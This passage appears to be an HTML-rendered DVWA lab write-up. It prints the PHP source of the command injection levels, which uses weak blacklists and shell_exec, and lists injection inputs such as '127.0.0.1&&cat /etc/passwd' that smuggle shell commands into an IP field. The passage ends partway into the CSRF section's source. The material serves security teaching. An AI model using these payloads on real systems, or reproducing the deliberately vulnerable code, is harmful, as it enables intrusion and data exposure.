class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$target</span> = stripslashes( <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Split the IP into 4 octects</span></span><br><span class=\"line\">    <span class=\"variable\">$octet</span> = explode( <span class=\"string\">&quot;.&quot;</span>, <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check IF each octet is an integer</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">0</span>] ) ) &amp;&amp; ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">1</span>] ) ) &amp;&amp; ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">2</span>] ) ) &amp;&amp; ( is_numeric( <span class=\"variable\">$octet</span>[<span class=\"number\">3</span>] ) ) &amp;&amp; ( sizeof( <span class=\"variable\">$octet</span> ) == <span class=\"number\">4</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class=\"line\">        <span class=\"variable\">$target</span> = <span class=\"variable\">$octet</span>[<span class=\"number\">0</span>] . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$octet</span>[<span class=\"number\">1</span>] . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$octet</span>[<span class=\"number\">2</span>] . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$octet</span>[<span class=\"number\">3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Windows</span></span><br><span class=\"line\">            <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// *nix</span></span><br><span class=\"line\">            <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Ops. Let the user name theres a mistake</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#High Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = trim(<span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set blacklist</span></span><br><span class=\"line\">    <span class=\"variable\">$substitutions</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&#x27;&amp;&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;;&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;| &#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;-&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;$&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;(&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;)&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;`&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;||&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Remove any of the charactars in the array (blacklist).</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = str_replace( array_keys( <span class=\"variable\">$substitutions</span> ), <span class=\"variable\">$substitutions</span>, <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Windows</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// *nix</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Medium Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Set blacklist</span></span><br><span class=\"line\">    <span class=\"variable\">$substitutions</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;;&#x27;</span>  =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Remove any of the charactars in the array (blacklist).</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = str_replace( array_keys( <span class=\"variable\">$substitutions</span> ), <span class=\"variable\">$substitutions</span>, <span class=\"variable\">$target</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Windows</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// *nix</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Low Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$target</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;ip&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Determine OS and execute the ping command.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( stristr( php_uname( <span class=\"string\">&#x27;s&#x27;</span> ), <span class=\"string\">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Windows</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// *nix</span></span><br><span class=\"line\">        <span class=\"variable\">$cmd</span> = shell_exec( <span class=\"string\">&#x27;ping  -c 4 &#x27;</span> . <span class=\"variable\">$target</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for the end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-2\"><a class=\"markdownIt-Anchor\" href=\"#low-2\">#</a> Low</h3>\n<ul>\n<li>\n<p>127.0.0.1</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180350690.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425180350690\"></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp; whoami</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425180709539.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425180709539\"></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp; pwd</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425182713991.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425182713991\"></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp;ls …/…/</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183108288.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425183108288\"></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp;cat …/…/php.ini</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183656452.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425183656452\"></p>\n</li>\n<li>\n<p>127.0.0.1&amp;&amp;cat /etc/passwd</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425183851680.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425183851680\"></p>\n</li>\n</ul>\n<h3 id=\"medium-2\"><a class=\"markdownIt-Anchor\" href=\"#medium-2\">#</a> Medium</h3>\n<ul>\n<li>\n<p>127.0.0.1&amp; ls</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184026503.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425184026503\"></p>\n</li>\n<li>\n<p>127.0.0.1&amp; cat /etc/passwd</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184132006.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425184132006\"></p>\n</li>\n</ul>\n<h3 id=\"high-2\"><a class=\"markdownIt-Anchor\" href=\"#high-2\">#</a> High</h3>\n<ul>\n<li>127.0.0.1 |ls</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425184427077.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425184427077\"></p>\n<hr>\n<h2 id=\"cross-site-request-forgery-csrf\"><a class=\"markdownIt-Anchor\" href=\"#cross-site-request-forgery-csrf\">#</a> Cross Site Request Forgery (CSRF)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># CSRF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Impossible CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_current&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise current password input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = stripslashes( <span class=\"variable\">$pass_curr</span> );</span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_curr</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$pass_curr</span> = md5( <span class=\"variable\">$pass_curr</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check that the current password is correct</span></span><br><span class=\"line\">    <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:password&#x27;</span>, <span class=\"variable\">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Do both new passwords match and does the current password match the user?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &amp;&amp; ( <span class=\"variable\">$data</span>-&gt;rowCount() == <span class=\"number\">1</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// It does!</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = stripslashes( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Update database with new password</span></span><br><span class=\"line\">        <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:password&#x27;</span>, <span class=\"variable\">$pass_new</span>, PDO::PARAM_STR );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for the user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Issue with passwords matching</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># High CSRF Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass_new</span>  = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_new&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass_conf</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password_conf&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Do the passwords match?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$pass_new</span> == <span class=\"variable\">$pass_conf</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// They do!</span></span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass_new</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"variable\">$pass_new</span> = md5( <span class=\"variable\">$pass_new</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Update the database</span></span><br><span class=\"line\">        <span class=\"variable\">$insert</span> = <span class=\"string\">&quot;UPDATE `users` SET password = &#x27;<span class=\"subst\">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class=\"string\">&quot;&#x27;;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span 